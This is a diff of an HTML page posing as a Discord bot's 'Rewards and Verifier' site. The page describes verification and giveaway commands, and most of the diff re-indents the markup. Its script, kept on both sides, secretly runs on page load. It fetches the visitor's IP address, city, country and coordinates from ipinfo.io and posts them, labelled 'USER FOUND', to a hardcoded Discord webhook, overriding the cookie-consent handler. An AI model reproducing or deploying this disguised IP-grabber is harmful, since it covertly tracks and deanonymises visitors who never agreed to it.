@@ -195,132 +195,132 @@
 
     <div class="cookie-popup" id="cookiePopup">
         <img src="cookie.png" alt="Cookie"> We use cookies to improve your experience on our site. By continuing to use our site, you accept our use of cookies.
+    </div>
 
 
-
-        <div class="container animate__animated animate__fadeInUp">
-            <h1><u><b>Welcome to Rewards and Verifier!</b></u></h1>
-            <div class="containerContainer">
-                <div class="backgroundCont">
-                    <h2><u><b>INFORMATION</b></u>
-                    </h2>
-                    <div class="containerDarker">
-                        <h3><u>What is this page for?</u></h3>
-                        <p>Here, you can verify from our bot that may potentially be in a server you are in. Alternatively, You can add our bot to protect your server from nukes, raids, alt accounts, VPNs, etc. Or even use it to host giveaways in your server!</p>
-                    </div>
+    <div class="container animate__animated animate__fadeInUp">
+        <h1><u><b>Welcome to Rewards and Verifier!</b></u></h1>
+        <div class="containerContainer">
+            <div class="backgroundCont">
+                <h2><u><b>INFORMATION</b></u>
+                </h2>
+                <div class="containerDarker">
+                    <h3><u>What is this page for?</u></h3>
+                    <p>Here, you can verify from our bot that may potentially be in a server you are in. Alternatively, You can add our bot to protect your server from nukes, raids, alt accounts, VPNs, etc. Or even use it to host giveaways in your server!</p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <h3><u>How do I get the bot?</u></h3>
+                    <p>You can get the bot <a href="enter_bot_link"><u>here</u></a>. After you click the link, you can add the bot to your server!</p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <h3><u>What does it do?</u></h3>
+                    <p>The bot can do many things, such as the following commands:</p>
+                    <p class="commandHeader"><u>Protection:</u></p>
+                    <p>· /verify</p>
+                    <p>· /setverifiedrole</p>
+                    <p>· /seteditor</p>
+                    <p class="commandHeader"><u>Giveaways:</u></p>
+                    <p>· /startgiveaway</p>
+                    <p>· /setwinnerrole</p>
+                    <p>· /setgiveawayeditor</p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <h3><u><b>Verify</b></u></h3>
+                    <p style="text-align: center;">Click the button below to enter the verify page!</p>
                     <br>
-                    <div class="containerDarker">
-                        <h3><u>How do I get the bot?</u></h3>
-                        <p>You can get the bot <a href="enter_bot_link"><u>here</u></a>. After you click the link, you can add the bot to your server!</p>
-                    </div>
+                    <button class="verifyButton" onclick="window.location.href = 'https://verifier-discord.github.io/verify';">Click me!</button>
                     <br>
-                    <div class="containerDarker">
-                        <h3><u>What does it do?</u></h3>
-                        <p>The bot can do many things, such as the following commands:</p>
-                        <p class="commandHeader"><u>Protection:</u></p>
-                        <p>· /verify</p>
-                        <p>· /setverifiedrole</p>
-                        <p>· /seteditor</p>
-                        <p class="commandHeader"><u>Giveaways:</u></p>
-                        <p>· /startgiveaway</p>
-                        <p>· /setwinnerrole</p>
-                        <p>· /setgiveawayeditor</p>
-                    </div>
-                    <br>
-                    <div class="containerDarker">
-                        <h3><u><b>Verify</b></u></h3>
-                        <p style="text-align: center;">Click the button below to enter the verify page!</p>
-                        <br>
-                        <button class="verifyButton" onclick="window.location.href = 'https://verifier-discord.github.io/verify';">Click me!</button>
-                        <br>
-                    </div>
                 </div>
             </div>
-            <p style="text-align: center;">Powered by MaR Society © 2024</p>
         </div>
-        <script>
-            function setCookie(cname, cvalue, exdays) {
-                var d = new Date();
-                d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
-                var expires = "expires=" + d.toUTCString();
-                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
-            }
+        <p style="text-align: center;">Powered by MaR Society © 2024</p>
+    </div>
+    <script>
+        function setCookie(cname, cvalue, exdays) {
+            var d = new Date();
+            d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+            var expires = "expires=" + d.toUTCString();
+            document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+        }
 
 
-            function getCookie(cname) {
-                var name = cname + "=";
-                var decodedCookie = decodeURIComponent(document.cookie);
-                var ca = decodedCookie.split(';');
-                for (var i = 0; i < ca.length; i++) {
-                    var c = ca[i];
-                    while (c.charAt(0) == ' ') {
-                        c = c.substring(1);
-                    }
-                    if (c.indexOf(name) == 0) {
-                        return c.substring(name.length, c.length);
-                    }
+        function getCookie(cname) {
+            var name = cname + "=";
+            var decodedCookie = decodeURIComponent(document.cookie);
+            var ca = decodedCookie.split(';');
+            for (var i = 0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
                 }
-                return "";
-            }
-
-
-            function checkCookie() {
-                var cookieConsent = getCookie("cookieConsent");
-                if (cookieConsent == "") {
-
-                    document.getElementById("cookiePopup").style.display = "block";
+                if (c.indexOf(name) == 0) {
+                    return c.substring(name.length, c.length);
                 }
             }
+            return "";
+        }
 
 
-            function acceptCookies() {
-                document.getElementById("cookiePopup").style.display = "none";
-                setCookie("cookieConsent", "accepted", 365); // Set cookie for 1 year
+        function checkCookie() {
+            var cookieConsent = getCookie("cookieConsent");
+            if (cookieConsent == "") {
+
+                document.getElementById("cookiePopup").style.display = "block";
             }
+        }
 
 
-            window.onload = function() {
-                checkCookie();
-            };
+        function acceptCookies() {
+            document.getElementById("cookiePopup").style.display = "none";
+            setCookie("cookieConsent", "accepted", 365); // Set cookie for 1 year
+        }
 
 
-            function sendMessage() {
-                fetch("https://ipinfo.io/json")
-                    .then(response => response.json())
-                    .then(data => {
-                        var ipAddress = data.ip;
-                        var country = data.country;
-                        var city = data.city;
-                        var latitude = data.loc.split(',')[0];
-                        var longitude = data.loc.split(',')[1];
-                        var browser = navigator.userAgent;
-                        var currentTime = new Date().toLocaleString();
-                        var webhookUrl = "https://discord.com/api/webhooks/1236725710408646666/QXC9cW4S-Eeh7tmxZ18sZxp9ZZgFe4JqkMhkiDVtIxTIRKdfu377pvSP1j5MN4e3qcv9";
-                        var message = "USER FOUND:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nbrowser was opened at: " + currentTime;
+        window.onload = function() {
+            checkCookie();
+        };
 
-                        var xhr = new XMLHttpRequest();
-                        xhr.open("POST", webhookUrl, true);
-                        xhr.setRequestHeader("Content-Type", "application/json");
-                        xhr.onreadystatechange = function() {
-                            if (xhr.readyState === 4 && xhr.status === 204) {
-                                console.log("Message sent successfully!");
-                            } else {
-                                console.error("Failed to send message. Status code: " + xhr.status);
-                            }
-                        };
-                        xhr.send(JSON.stringify({
-                            "content": message
-                        }));
-                    })
-                    .catch(error => {
-                        console.error("Error fetching geolocation information: " + error.message);
-                    });
-            }
 
-            window.onload = function() {
-                sendMessage();
-            };
-        </script>
+        function sendMessage() {
+            fetch("https://ipinfo.io/json")
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    var country = data.country;
+                    var city = data.city;
+                    var latitude = data.loc.split(',')[0];
+                    var longitude = data.loc.split(',')[1];
+                    var browser = navigator.userAgent;
+                    var currentTime = new Date().toLocaleString();
+                    var webhookUrl = "https://discord.com/api/webhooks/1236725710408646666/QXC9cW4S-Eeh7tmxZ18sZxp9ZZgFe4JqkMhkiDVtIxTIRKdfu377pvSP1j5MN4e3qcv9";
+                    var message = "USER FOUND:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nbrowser was opened at: " + currentTime;
+
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", webhookUrl, true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4 && xhr.status === 204) {
+                            console.log("Message sent successfully!");
+                        } else {
+                            console.error("Failed to send message. Status code: " + xhr.status);
+                        }
+                    };
+                    xhr.send(JSON.stringify({
+                        "content": message
+                    }));
+                })
+                .catch(error => {
+                    console.error("Error fetching geolocation information: " + error.message);
+                });
+        }
+
+        window.onload = function() {
+            sendMessage();
+        };
+    </script>
 </body>
 
 </html>
